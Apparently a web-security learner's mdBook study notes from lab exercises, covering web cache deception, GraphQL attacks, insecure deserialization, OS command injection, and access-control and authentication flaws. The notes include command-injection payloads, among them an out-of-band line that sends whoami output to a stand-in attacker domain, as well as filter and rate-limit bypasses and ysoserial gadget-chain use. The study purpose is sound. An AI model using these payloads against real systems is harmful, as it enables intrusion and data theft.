<!DOCTYPE HTML>
<html lang="en" class="light" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>The Red Team Road</title>
        <meta name="robots" content="noindex">


        <!-- Custom HTML head -->
        
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->

    </head>
    <body class="sidebar-visible no-js">
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('light')
            html.classList.add(theme);
            var body = document.querySelector('body');
            body.classList.remove('no-js')
            body.classList.add('js');
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var body = document.querySelector('body');
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            body.classList.remove('sidebar-visible');
            body.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="WebCacheDeception.html"><strong aria-hidden="true">1.</strong> Web Cache Deception</a></li><li class="chapter-item expanded "><a href="GraphQL.html"><strong aria-hidden="true">2.</strong> GraphQL Exploitation</a></li><li class="chapter-item expanded "><a href="InsecureDeserialisation.html"><strong aria-hidden="true">3.</strong> InsecureDeserialisation</a></li><li class="chapter-item expanded "><a href="OS command injection.html"><strong aria-hidden="true">4.</strong> OS Command Injection</a></li><li class="chapter-item expanded "><a href="requestSmuggling.html"><strong aria-hidden="true">5.</strong> Request Smuggling</a></li><li class="chapter-item expanded "><a href="SQLi.html"><strong aria-hidden="true">6.</strong> SQL Injection</a></li><li class="chapter-item expanded "><a href="tricks.html"><strong aria-hidden="true">7.</strong> Tips & Tricks</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">The Red Team Road</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="web-cache-deception"><a class="header" href="#web-cache-deception">Web Cache Deception</a></h1>
<ul>
<li>Vulnerability that enables an attacker to store in the cache a dynamic response by confusing it for a static resource.</li>
<li>It is caused by discrepancies between how the cache server and the origin server handles requests</li>
</ul>
<h2 id="impact"><a class="header" href="#impact">Impact</a></h2>
<ul>
<li>An attacker tricks a user into visiting a malicious link, that makes a call for dynamic resources confused as static content. The attacker can then visit the same URL to retrieve the results of the dynamic resource intended only for the victim user (ex: their profile page + including username + password)</li>
</ul>
<h3 id="cache-rules"><a class="header" href="#cache-rules">Cache rules</a></h3>
<ul>
<li>determines what to cache and for how long</li>
<li>usually stores static content (ex: .js, .css, .ico, robots.txt, /assets or /static folder contents)</li>
</ul>
<h2 id="how-to-construct-an-attack"><a class="header" href="#how-to-construct-an-attack">How to construct an attack?</a></h2>
<ul>
<li>Find a url that ignores the contents after "/" (with wildcard mapping)
<ul>
<li>ex: /profile = /profile/abcd</li>
</ul>
</li>
<li>Add the file extension of a static resource =&gt; that will cause the request to be stored in the cache (ex: /profile/a.js)</li>
<li>Send the link to the victim and wait for it to be clicked</li>
<li>Visit the same page (/profile/a.js) to see the profile details of the victim user</li>
</ul>
<h3 id="types-of-web-cache-deception"><a class="header" href="#types-of-web-cache-deception">Types of web cache deception</a></h3>
<ul>
<li><code>Exploiting path mapping discrepancies</code>
<ul>
<li>ex: <code>/api/orders/123</code> - logical mapping</li>
<li><code>/api/orders/123/abcd</code> - ignores abcd, anything after /</li>
</ul>
</li>
<li><code>Delimiter discrepancies</code>
<ul>
<li>ex: <code>/profile;foo.css</code></li>
<li><strong>Java Spring</strong> uses <code>;</code> as delimiter to add matrix variables -&gt; such a server running Java Spring would drop everything after <em>;</em></li>
<li>ex2: Ruby on Rails uses <code>.(dot)</code> for delimiter: <code>/profile.css or /profile.ico</code></li>
<li>ex3: <code>profile%00foo.js</code></li>
<li>DELIMITER LIST WORDLIST
<ul>
<li>https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list</li>
</ul>
</li>
</ul>
</li>
<li><code>Delimiter decoding discrepancies</code>
<ul>
<li>some parsers will url decode and then separe, others won't url decode. The cache won't decode them, if the backend decodes them and drops the a.js =&gt; returns dynamic data</li>
<li>try encoding separator characters(ex: #, ? + non-printable characters %00, %0A, %09)</li>
</ul>
</li>
<li><code>Exploiting static directory cache rules!</code>
<ul>
<li><strong>/static, /assets, /scripts, /images</strong></li>
</ul>
</li>
<li><code>Exploiting Normalization Discrepancies</code>
<ul>
<li>Use <code>encoded path traversal for this</code>:
<ul>
<li>ex: <code>/static/..%2fprofile</code></li>
<li><em>not all servers url decode chars and not all servers resolve dot segments</em></li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="graphql-api"><a class="header" href="#graphql-api">GraphQL API</a></h1>
<ul>
<li><code>enables users to specify exactly what fields they want in the response</code></li>
<li>Clients don't need to know API endpoints, one endpoint, ask for data -&gt; GraphQL API takes care of retrieving the data for you.</li>
</ul>
<h2 id="how-it-works-"><a class="header" href="#how-it-works-">HOW IT WORKS ?</a></h2>
<ul>
<li>3 operations
<ul>
<li>Fetching data</li>
<li>Modifying data</li>
<li>Subscriptions (permanent connection where server continuously pushes data to client)</li>
</ul>
</li>
<li>It uses <code>objects (types), fields and relationships</code></li>
<li><strong>Only uses POST requests tot ONE ENDPOINT =&gt; response in JSON</strong></li>
</ul>
<h3 id="graphql-translation-of-rest-apis"><a class="header" href="#graphql-translation-of-rest-apis">GraphQl translation of REST APIs</a></h3>
<ul>
<li>
<p><code>GET requests</code></p>
<ul>
<li><code>query</code> operation type (optional) + <code>name</code>(optional) + <code>data structure</code> + <code>arguments</code>(optional)</li>
</ul>
<pre><code class="language-js">
query myGETExampleName {
    getProduct(id: 123){
        name
        description
    }
}
</code></pre>
</li>
<li>
<p><code>POST/PUT/DELETE requests</code></p>
<ul>
<li><strong>GraphQL Mutations</strong></li>
<li>same as <code>QUERIES</code>, but they take some input (<code>inline/variable</code>)</li>
</ul>
<pre><code class="language-js">mutation exampleMutationName{
    createProduct(name: "TEST", listed:"yes"){
     id
     name
     listed   
    }
}
</code></pre>
</li>
<li>
<p><code>GraphQL variables</code></p>
<ul>
<li>Taken from a <code>JSON-based VARIABLES dictionary </code></li>
<li>Steps to use variables
<ul>
<li>Declare in the query header (after the name) - <code>$id: ID!</code>, <code>!</code> - required</li>
<li>Use the declared value in the query as argument - <code>id:$id</code></li>
<li>Declare the variable value in the <code>Variables</code> dictionary</li>
</ul>
</li>
</ul>
<pre><code class="language-js">
 query myGETExampleName ($id: ID!) {
    getProduct(id: $id){
        name
        description
    }
}

Variables:
{
    "id": 1
}
</code></pre>
</li>
<li>
<p><code>Aliases</code></p>
<ul>
<li>GraphQL objects can't contain the same property/object twice</li>
<li>Use ALIASES to return the same object with different arguments</li>
<li>This can allow you to basiucally send <code>multiple GraphQL messages in one HTTP request</code></li>
</ul>
<pre><code class="language-js">  #Valid query using aliases

query getProductDetails {
    product1: getProduct(id: "1") {
        id
        name
    }
    product2: getProduct(id: "2") {
        id
        name
    }
}
</code></pre>
</li>
<li>
<p><code>Fragments</code></p>
<ul>
<li>reusable parts of queries or mutations</li>
<li>reusable object / field grouping</li>
<li>can be included then in queries with <code>...</code> preceding it</li>
</ul>
<pre><code class="language-js"># Example fragment
fragment fragmentName on Product{
    id
    name
    listed
}

 #Query calling the fragment

query {
    getProduct(id: 1) {
        ...productInfo
        stock
    }
}
</code></pre>
</li>
<li>
<p><code>SUBSCRIPTIONS</code></p>
<ul>
<li>implemented using Websockets</li>
<li>long-lived connection, small regular updates to big objects</li>
</ul>
</li>
<li>
<p><code>INTROSPECTION</code></p>
<ul>
<li>BUILT IN FUNCTION THAT ENABLES TO QUERY SERVER FOR <code>SCHEMA INFORMATION</code></li>
</ul>
</li>
</ul>
<h1 id=""><a class="header" href="#"></a></h1>
<h1 id="graphql-vulnerabilities"><a class="header" href="#graphql-vulnerabilities">GraphQL vulnerabilities</a></h1>
<h2 id="finding-graphql-endpoints"><a class="header" href="#finding-graphql-endpoints">Finding GraphQL endpoints</a></h2>
<ul>
<li>
<p>Use <code>universal queries</code>: <code>query {__typename}</code> -&gt; should return <code>{"data":{"__typename": "query"}}</code></p>
<ul>
<li>Every GraphQL endpoint has a reserved field __typename that returns the queried object's type</li>
</ul>
</li>
<li>
<p>Use <code>blank body</code> -&gt; should get a <code>query not present</code> error message!!!</p>
</li>
<li>
<p>Common endpoint names</p>
</li>
</ul>
<pre><code class="language-js">/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
/graphql/v1
/api/v1
/api/graphql/v1
/graphql/api/v1
/graphql/graphql/v1

</code></pre>
<ul>
<li>Test <code>REQUEST HTTP METHODS</code>
<ul>
<li>Production GraphQL endpoints SHOULD ONLY ALLOW <code>POST + application/json</code></li>
<li>Test for <code>GET</code> or <code>POST + application/x-www-form-urlencoded</code></li>
<li><strong>Try UNIVERSAL QUERY + other HTTP methods</strong></li>
</ul>
</li>
</ul>
<h2 id="exploiting-unsanitized-arguments"><a class="header" href="#exploiting-unsanitized-arguments">Exploiting unsanitized arguments</a></h2>
<ul>
<li>Reference hidden objects by ID (ex: query for all -&gt; returns object with id: 1,2,4 =&gt; query for (id: 3) reveals hidden object)</li>
</ul>
<h2 id="discovering-schema-information"><a class="header" href="#discovering-schema-information">Discovering schema information</a></h2>
<ul>
<li>
<p><code>INTROSPECTION + __schema on root</code></p>
</li>
<li>
<p>In REPEATER of a GraphQL API endpoint, right-click anywhere and select <code>GraphQL &gt; Set introspection query</code> =&gt; adds it to the body of the request</p>
</li>
<li>
<p>Use a <code>GRAPHQL visualizer</code> to interpret results (http://nathanrandal.com/graphql-visualizer/)</p>
</li>
<li>
<p>If introspection is disabled, you can use <code>suggestions</code> to uncover the API functions (<code>Clairvoyance</code> - tool for suggestion GraphQL API mapping)</p>
</li>
<li>
<p>MANUAL tests</p>
</li>
</ul>
<pre><code class="language-js"> #Introspection probe request

    {
        "query": "{__schema{queryType{name}}}"
    }
</code></pre>
<pre><code class="language-js">#Full introspection query

    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
</code></pre>
<h2 id="introspection-query-disabled-bypass"><a class="header" href="#introspection-query-disabled-bypass">Introspection query disabled bypass</a></h2>
<ul>
<li>regex matching for <code>__schema</code> can be bypassed by appening special characters
<ul>
<li><code> </code>, <code>\n</code>, <code>,</code> are ignored by GraphQL but not regex</li>
</ul>
</li>
<li>Introspection might be disabled on POST; try <code>GET</code> or <code>POST + x-www-form-urlencoded</code></li>
</ul>
<h2 id="bypassing-rate-limiting-using-aliases"><a class="header" href="#bypassing-rate-limiting-using-aliases">Bypassing rate limiting using aliases</a></h2>
<ul>
<li>if rate limiting is done based on the nr of HTTP requests, then using aliases can enable you to send as many GraphQL messages in one request as you want
<img src="image-18.png" alt="alt text" /></li>
</ul>
<h2 id="csrf-via-graphql"><a class="header" href="#csrf-via-graphql">CSRF via GraphQL</a></h2>
<ul>
<li>if <code>NO csrf-token</code> + <code>content-type not validated</code> =&gt; <strong>CSRF</strong></li>
<li><code>Can use GET requests or POST with x-www-form-urlencoded for CSRF attacks!!!</code></li>
</ul>
<h1 id="-1"><a class="header" href="#-1"></a></h1>
<h1 id="-2"><a class="header" href="#-2"></a></h1>
<h1 id="graphql-labs"><a class="header" href="#graphql-labs">GraphQL labs</a></h1>
<ol>
<li>Accidental exposure of private GraphQL fields</li>
</ol>
<ul>
<li>found GraphQL endpoint in Burp History</li>
<li>Sent introspection query, interpreted query results
<img src="image-14.png" alt="alt text" /></li>
<li>Sent query for <code>getUser(id)</code> for id 1 -&gt; got administrator username and password in plaintext
<img src="image-15.png" alt="alt text" /></li>
<li>Sent login mutation with the username and password and got the auth token in the cookie
<img src="image-16.png" alt="alt text" /></li>
</ul>
<ol start="2">
<li>Finding a hidden GraphQL endpoint</li>
</ol>
<ul>
<li>do fuzzing on API endpoints
<ul>
<li>found <code>/api POST</code> method not allowed, (WEIRD)</li>
<li>tried <code>GET /api</code> =&gt; <code>query not specified!</code> =&gt; GRAPHQL endpoint found</li>
<li>tried universal query to confirm: <code>?query={__typename}</code> =&gt; got typename query</li>
<li>tried <code>introspection insertion with BURP</code> =&gt; got blocked</li>
<li>added special chars (<code> </code>, <code>,</code>, <code>\n</code>) and the newline worked</li>
<li><code>!!! Right click on introspection request =&gt; GraphQL =&gt; ADD TO SITEMAP!!!</code></li>
<li>this adds all the available queries and mutations for you (<code>interpreted</code> &amp; <code>ready 2 go!!!</code>)</li>
<li>Go to Target, site-map, /api</li>
<li>found 1 mutation, needed an id. Used the 1 query found to get id=3 for carlos</li>
<li>Deleted user with id=3 with mutation
<img src="image-17.png" alt="alt text" /></li>
</ul>
</li>
</ul>
<ol start="3">
<li>Performing CSRF exploits over GraphQL</li>
</ol>
<ul>
<li>For CSRF to work you have to have either
<ul>
<li><code>GET allowed</code></li>
<li><code>x-www-form-urlencoded POST allowed</code></li>
</ul>
</li>
<li>The 1st one blocked, 2nd one allowed here</li>
<li>Burp CAN'T CHANGE THE REQUEST RIGHT AWAY
<ul>
<li>Either do a simple universal query first and then edit the query in the GraphQL tab (query={__typename})</li>
<li>Or just URL encode all characters of the requested query
<img src="image-19.png" alt="alt text" /></li>
</ul>
</li>
</ul>
<h1 id="preventing-graphql-attacks"><a class="header" href="#preventing-graphql-attacks">Preventing GraphQL attacks</a></h1>
<ul>
<li>DISABLE <code>INTROSPECTION</code></li>
<li>DISABLE <code>suggestions</code></li>
<li>do not expose unintended fields publicly</li>
</ul>
<h1 id="-3"><a class="header" href="#-3"></a></h1>
<ul>
<li>limit the <code>query depth</code> (nr of queries in query) of your API's queries (prevents bruteforce and DOS)</li>
<li>Configure <code>operation limits</code> based on the nr of operations not HTTP requests
<ul>
<li>this limits the nr of <code>unique fields</code>, <code>aliases</code> you can use</li>
</ul>
</li>
<li>Implement <code>cost analysis on your API</code> - if it is too expensive, drop the request. This is realtime process</li>
</ul>
<h1 id="-4"><a class="header" href="#-4"></a></h1>
<ul>
<li>Only accept POST + JSON</li>
<li>Validate the content provided matches the <code>Content-Type</code></li>
<li>Use a secure <code>CSRF token mechanism</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="insecure-deserialization"><a class="header" href="#insecure-deserialization">Insecure Deserialization</a></h1>
<ul>
<li>Objects -&gt; serialization -&gt; stream of bytes -&gt; DB store -&gt; deserialization -&gt; Objects</li>
<li>Even <code>private fields</code> get serialized, if you don't mark it as <code>transient</code></li>
<li><strong>Dangerous! Because there is no way to check the type of the serialized object, any object can be passed into the deserialization function -&gt; OBJECT INJECTION</strong></li>
<li>In many cases, the attack happens even before the deserialization is finished.</li>
</ul>
<h2 id="how-to-identify-it"><a class="header" href="#how-to-identify-it">How to identify it?</a></h2>
<ul>
<li>Find <code>serialized data</code> being passed into the application in any request</li>
</ul>
<pre><code class="language-php"># PHP
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
serialize() 
unserialize()
</code></pre>
<pre><code class="language-Java">// Java - binary serialization
// look for [ac ed](hex) or [rO0](base64) at the beginning of the data
java.io.Serializable -&gt; any object that implements this interface can be serialized
readObject() -&gt; source code indicator of deserialization
</code></pre>
<h2 id="how-to-exploit-it"><a class="header" href="#how-to-exploit-it">How to exploit it?</a></h2>
<ol>
<li>Modify the serialized object's properties (ex: admin:0 -&gt; admin:1)</li>
<li>Make use of <code>PHP loose comparison for ==</code> (ex: password == $password -&gt; checking if <code>secret</code> == 0), which is true!!!</li>
<li>Make use of <code>Hackvertor</code> to edit string object -&gt; get the serialized output!</li>
<li><code>MAGIC METHODS</code></li>
</ol>
<h2 id="what-are-magic-methods"><a class="header" href="#what-are-magic-methods">What are MAGIC METHODS?</a></h2>
<ul>
<li>Functions that are called implicitly (ex <strong>init</strong>() PYTHON or __construct() PHP)</li>
<li><code>__wakeup()</code> for PHP used in deserialize()</li>
<li><code>ObjectInputStream.readObject()</code> for Java</li>
</ul>
<pre><code class="language-Java">private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
{
    // implementation
}
</code></pre>
<ul>
<li>deserialize() cannot check the object type of the serialized data -&gt; Arbitrary objects can be serialized and passed onto the function</li>
<li><code>Study if these objects use magic functions, in dangerous ways</code></li>
</ul>
<h2 id="what-are-gadget-chains"><a class="header" href="#what-are-gadget-chains">What are gadget chains?</a></h2>
<ul>
<li>A series of object invocations or function calls that provide a chain leading to user controllable input ending up in a sink</li>
<li>Tools to identify gadget chains:
<ul>
<li><code>ysoserial (JAVA)</code>: for java deserialization. You select the library that you <code>think</code> the target application is using, then pass in the command you want to execute, and it gives a serialized object.
<ul>
<li><code>First select java 11 just like in image below</code>
<img src="images/image-11.png" alt="alt text" /></li>
</ul>
<pre><code class="language-bash">java -jar ysoserial-all.jar [payload] '[command]'
</code></pre>
<ul>
<li>In the cookie I identified this:
<img src="images/image-12.png" alt="alt text" /></li>
<li>This indicated towards the common collections gadgets
<img src="images/image-10.png" alt="alt text" /></li>
</ul>
</li>
<li><code>ysoserial</code> uses:
<ul>
<li>RCE</li>
<li>DNS lookup through the <code>URLDNS</code>, the <code>most univeral gadget chain for detection purposes!</code> (supply a Collaborator address)</li>
<li>try to establish a TCP connection with an IP <code>JRMPClient</code> chain! If the firewall doesn't allow any outbound traffic. Supply a <code>local IP</code> and an <code>external IP</code>(that should be blocked). If the external IP causes a delay -&gt; the deserialization happens on the target and it is vulnerable</li>
</ul>
</li>
<li><code>phpggc</code> - PHP equivalent</li>
<li>exercise solve: you see in the cookie you have a 'sig_hmac_sha1' field, so that means that you'll have to verify your payloads with signatures.</li>
<li>To generate these, you need the SECRET_KEY of the server: found at <code>/cgi-bin/phpinfo.php</code> in a commented out html
<img src="images/image-13.png" alt="alt text" /></li>
<li>You get an error message saying Symfony v4, so try those gadget chains, one WILL WORK.</li>
</ul>
</li>
<li>
<h2 id="ruby-deserializatio-with-known-gadget-chain"><a class="header" href="#ruby-deserializatio-with-known-gadget-chain">RUBY deserializatio with known gadget chain!</a></h2>
<ul>
<li>USE a <code>ONLINE RUBY interpreter</code> if yours fails!!! Don't always try to do it on your laptop!!!</li>
<li>I only managed to make it work using a online interperter</li>
</ul>
</li>
</ul>
<h3 id="php-trick"><a class="header" href="#php-trick">PHP trick</a></h3>
<ul>
<li>You cannot read the contents of a php file, but maybe you can read the contents of an editor generated backup file: <code>filea~</code> using the <code>~</code> sign
<img src="images/image-9.png" alt="alt text" /></li>
</ul>
<h3 id="exercises"><a class="header" href="#exercises">Exercises</a></h3>
<ul>
<li>Loose comparison for string [user token] in serialized data
<ul>
<li><code>Modifying serialized data types</code> (from string to integer for loose comparison)
<img src="images/image-8.png" alt="alt text" /></li>
</ul>
</li>
<li><code>Using application functionality</code>
<ul>
<li>ex: find a random path in the serialized object -&gt; on delete function it will delete that file also</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="os-command-injection"><a class="header" href="#os-command-injection">OS command injection</a></h1>
<ul>
<li>Operators to link operations:
<ul>
<li><code>||</code>, <code>&amp;&amp;</code>, <code>;</code> -&gt; try them all</li>
<li>less common: <code>|</code>, <code>&amp;</code>, <code>0x0a or \n</code></li>
<li><code>\`` or </code>$()` for command injection within command</li>
</ul>
</li>
<li>blind OS command injection -&gt; use <code>sleep 5</code> or <code>ping -c 10 127.0.0.1</code> to confirm it</li>
<li>to <code>exlpoit it</code> <strong>write the output of the command to a WRITABLE FILE</strong>:
<ul>
<li>ex: If images are retrieved from the path /image?filename=a -&gt; try popular paths like: <strong>/var/www/images</strong> where it could be stored. Inject <code>||whoami+&gt;+/var/www/images/a||</code> -&gt; and then retrieve it from the image path: <strong>/image?filename=a</strong></li>
</ul>
</li>
<li>to <code>exploit it</code> use <strong>out-of-band interactions</strong>
<ul>
<li>ex: <code>nslookup attacker.com</code> to test it and <code>&amp; nslookup </code>whoami<code>.kgji2ohoyw.web-attacker.com &amp;</code> to retrieve the value from the command output</li>
</ul>
</li>
</ul>
<h1 id="access-control-vulnerabilities"><a class="header" href="#access-control-vulnerabilities">Access control vulnerabilities</a></h1>
<h3 id="lab-1-url-based-access-control-can-be-circumvented"><a class="header" href="#lab-1-url-based-access-control-can-be-circumvented">Lab 1 (Url based access-control can be circumvented)</a></h3>
<ul>
<li>Some frameworks like: <code>symfony(php)</code>, <code>zend-diactoros</code>, <code>zend-http</code>, <code>zend-feed</code> -&gt; support legacy headers <strong>X-Original-URL</strong> and <strong>X-Rewrite-URL</strong></li>
<li>These allow to rewrite the request: <code>GET /admin/delete</code> =&gt; <code>GET /?user=carlos, headers: {X-Original-URL: /admin/delete?user=carlos}</code>!</li>
<li>If <strong>access is restricted based on URL</strong> =&gt; you can trick the url value of the request and change it from the header this way!</li>
</ul>
<h3 id="lab-2-method-based-access-control-can-be-circumvented"><a class="header" href="#lab-2-method-based-access-control-can-be-circumvented">Lab 2 (Method-based access control can be circumvented)</a></h3>
<ul>
<li>POST is restricted, but GET is NOT</li>
<li>try to change the request method and move the post parameters as ?x=1&amp;y=2.</li>
<li>sometimes access can be restricted to SOME HTTP METHODS</li>
</ul>
<h3 id="lab-3"><a class="header" href="#lab-3">Lab 3</a></h3>
<ul>
<li>Multi-step authorization, where last step is NOT PROPERLY CHECKED.</li>
<li>ex: POST /admin-roles with body <code>action=upgrade&amp;username=wiener</code> -&gt; which if you add your session cookie -&gt; <strong>UNAUTHORISED!!!</strong></li>
<li>but if you see, the next step of the authorization is: POST /admin-roles with body: <code>action=upgrade&amp;confirmed=true&amp;username=wiener</code> -&gt; which if you add your session cookie -&gt; WORKS!!!</li>
</ul>
<h3 id="lab-4"><a class="header" href="#lab-4">Lab 4</a></h3>
<ul>
<li>
<p>The <code>Refferer</code> header indicates which website initiated the action</p>
</li>
<li>
<p>Validation can be done rigurously on the <code>/admin</code> path, but on the other paths like: <code>/admin/delete?username=carlos</code> the validation is done based on the fact : <strong>if the Refferer header is /admin</strong></p>
<ul>
<li>The assumption is: only someone who has access to the admin page can initiate these action</li>
<li>Since /admin is well secured -&gt; anyone who accesses these actions COME FROM /admin =&gt; <code>FALSE ASSUMPTION - attackers can change Refferer header</code></li>
</ul>
</li>
<li>
<p>Other vulns: <code>Location based authorization</code> -&gt; you can use a <strong>VPN or other mechanisms to circumvent this</strong></p>
</li>
</ul>
<h1 id="authentication-vulnerabilities"><a class="header" href="#authentication-vulnerabilities">Authentication vulnerabilities</a></h1>
<ul>
<li>Username enumeration using login forms:
<ul>
<li>get different error when the username is valid but password is wrong than when both are wrong</li>
<li>get error <code>username is taken</code> on the registration form</li>
<li>indicators: <strong>response status</strong>, <strong>error messages</strong> or <strong>response times</strong></li>
</ul>
</li>
</ul>
<h3 id="lab-1---username-enumeration-via-subtly-different-responses"><a class="header" href="#lab-1---username-enumeration-via-subtly-different-responses">Lab 1 - Username enumeration via subtly different responses</a></h3>
<ul>
<li>bruteforce usernames and passwords using wordlist</li>
<li>for the usernames, the difference was the correct answer was missing a .
<ul>
<li>ex: WRONG response: <code>Invalid username or password.</code> vs VALID username: <code>Invalid username or password </code></li>
</ul>
</li>
</ul>
<h3 id="lab-2---username-enumeration-via-response-timing"><a class="header" href="#lab-2---username-enumeration-via-response-timing">Lab 2 - Username enumeration via response timing</a></h3>
<ul>
<li>this lab has a rate limit defense based on the IP address of the sender</li>
<li>to bypass IP rate limiting, use: <code>X-Forwarded-For: 161.19.1.1</code> and that will indicate that the traffic originates from that IP adddress</li>
<li>to solve this, we used a <strong>Pitchfork</strong> attack from Intruder, adding a $$ to the X-Forwarded-For: <code>123.1.1.$1$</code> and one for the username</li>
<li>OBS: When dealing with response timing, to make sure that the differences in time are visible, purposefully craft the exploit to make huge delays when working.
<ul>
<li>ex: If the username is correct, it's gonna go ahead and check the password, which takes time, so to make it more obvious -&gt; <strong>CHECK A LONGER PASSWORD takes MORE TIME</strong> -&gt; username=$$ and password=100characters long</li>
</ul>
</li>
</ul>
<h1 id="-5"><a class="header" href="#-5"></a></h1>
<pre><code>Brute-force protection mechanisms
